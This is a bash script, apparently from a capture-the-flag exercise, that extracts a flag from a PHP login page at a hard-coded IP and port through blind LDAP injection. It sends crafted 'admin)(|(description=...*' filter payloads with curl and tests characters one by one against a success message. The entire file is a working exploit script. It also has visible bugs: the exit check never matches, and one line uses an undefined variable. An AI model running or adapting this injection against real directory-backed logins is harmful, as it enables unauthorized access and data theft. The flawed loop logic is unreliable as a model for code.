#!/bin/bash

# Define the target URL and headers
url="http://94.237.58.96:49697/index.php"
headers=(
  "-H" "Host: 94.237.58.96:49697"
  "-H" "Cache-Control: max-age=0"
  "-H" "Accept-Language: en-US,en;q=0.9"
  "-H" "Upgrade-Insecure-Requests: 1"
  "-H" "Origin: http://94.237.58.96:49697"
  "-H" "Content-Type: application/x-www-form-urlencoded"
  "-H" "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36"
  "-H" "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
  "-H" "Referer: http://94.237.58.96:49697/"
  "-H" "Accept-Encoding: identity"  # Disable automatic gzip compression
  "-H" "Cookie: PHPSESSID=gab82kje0qe5o0urm8cq3btc5d"
  "-H" "Connection: keep-alive"
)

# Define the payload pattern
payload_pattern="username=admin)(|(description=${payload}*&password=invalid)"

# Function to check for the success message in the response
check_success() {
  if echo "$1" | grep -q "Login successful but the site is temporarily down for security reasons."; then
    return 0  # success
  else
    return 1  # not found
  fi
}

# Function to send the request and get the response
send_request() {
  local payload="$1"

  # Send POST request using curl
  response=$(curl -s -X POST "$url" "${headers[@]}" --data "$payload")

  # Check if the success message is in the response
  if check_success "$response"; then
    return 0  # success
  else
    return 1  # not successful
  fi
}

# Main loop to try each character in the charset
charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*(){}"
flag=""
position=1
total_chars=${#charset}

# Add progress bar with pv (pipe viewer)
while true; do
  echo "Checking position $position..."

  # Iterate through each character in the charset
  for char in $(echo $charset | fold -w1); do
    payload="${flag}${char}"  # Build the new payload with the current flag and char

    if send_request "username=admin)(|(description=${payload}*&password=invalid)"; then
      flag+=$char  # Append the found character to the flag
      echo "Found character: $char"
      echo "Flag so far: $flag"
      position=$((position + 1))
      break
    fi
  done

  # Exit if the flag is complete (it might stop at a certain length or timeout)
  if [ ${#flag} -eq $position ]; then
    break
  fi

  # Display the progress bar using pv
  progress=$((position * 100 / total_chars))
  echo "$progress" | pv -N "Progress" -p -t -e -a > /dev/null
done

echo "Final flag: $flag"
